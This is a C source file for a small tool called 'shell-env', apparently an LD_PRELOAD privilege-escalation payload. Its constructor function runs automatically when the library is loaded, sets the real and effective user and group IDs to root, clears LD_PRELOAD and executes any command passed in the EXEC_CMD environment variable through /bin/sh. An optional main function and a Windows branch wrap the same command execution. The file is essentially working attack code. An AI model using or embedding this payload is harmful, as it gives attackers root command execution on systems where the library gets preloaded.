#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>

#ifdef _WIN32
#include <windows.h>
#include <process.h>
#else
#include <unistd.h>
#endif

static void exec_shell_cmd(const char* cmd) {
    fprintf(stderr, "[+] Executing command: %s\n", cmd);

#ifdef _WIN32
    const char* comspec = getenv("COMSPEC");
    if (!comspec) comspec = "cmd.exe";

    /* "cmd.exe /C <cmd>" */
    size_t need = strlen(comspec) + strlen(cmd) + 8;
    char* cmdline = (char*)malloc(need);
    if (!cmdline) {
        fprintf(stderr, "[-] Out of memory\n");
        return;
    }
    snprintf(cmdline, need, "%s /C %s", comspec, cmd);

    fprintf(stderr, "[+] Spawning shell to execute command\n");

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);

    if (!CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[-] CreateProcess failed (%lu)\n", (unsigned long)GetLastError());
        free(cmdline);
        return;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    free(cmdline);
#else
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");

    fprintf(stderr, "[+] Spawning shell to execute command\n");

    unsetenv("LD_PRELOAD");

    execl("/bin/sh", "sh", "-c", cmd, NULL);
    fprintf(stderr, "[-] Failed to execute shell: %s\n", strerror(errno));
#endif
}

#ifndef _WIN32
__attribute__((constructor)) void init(void) {
    if (getenv("SHELL_ENV_ACTIVE")) return;
    if (getenv("SHELL_ENV_MAIN")) return;

    setenv("SHELL_ENV_ACTIVE", "1", 1);
    const char* cmd = getenv("EXEC_CMD");
    if (!cmd) return;
    exec_shell_cmd(cmd);
}
#endif

#ifdef ENABLE_MAIN
int main(int argc, char *argv[]) {
#ifdef _WIN32
    _putenv("SHELL_ENV_MAIN=1");
    _putenv("SHELL_ENV_ACTIVE=1");
#else
    setenv("SHELL_ENV_MAIN", "1", 1);
    setenv("SHELL_ENV_ACTIVE", "1", 1);
#endif

    char *cmd = NULL;

    if (argc > 1) {
        if (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0) {
            printf("shell-env - Execute command utility\n");
            printf("Usage: %s [options] [command]\n", argv[0]);
            printf("\nOptions:\n");
            printf("  -h, --help    Show this help message\n");
            printf("  -c <cmd>      Command to execute\n");
            printf("\nExamples:\n");
            printf("  %s 'id; whoami'              # Execute command\n", argv[0]);
            printf("  %s -c 'ls -la /tmp'          # Execute with -c option\n", argv[0]);
            printf("  EXEC_CMD='ps aux' %s         # Use environment variable\n", argv[0]);
            printf("\nEnvironment:\n");
            printf("  EXEC_CMD=<command>  Command to execute (fallback if no args)\n");
            return 0;
        } else if (strcmp(argv[1], "-c") == 0 && argc > 2) {
            cmd = argv[2];
        } else {
            cmd = argv[1];
        }
    }

    if (!cmd) {
        cmd = getenv("EXEC_CMD");
    }

    if (!cmd) {
        fprintf(stderr, "Error: No command specified\n");
        fprintf(stderr, "Use: %s <command> or set EXEC_CMD environment variable\n", argv[0]);
        return 1;
    }

    exec_shell_cmd(cmd);
    return 0;
}
#endif
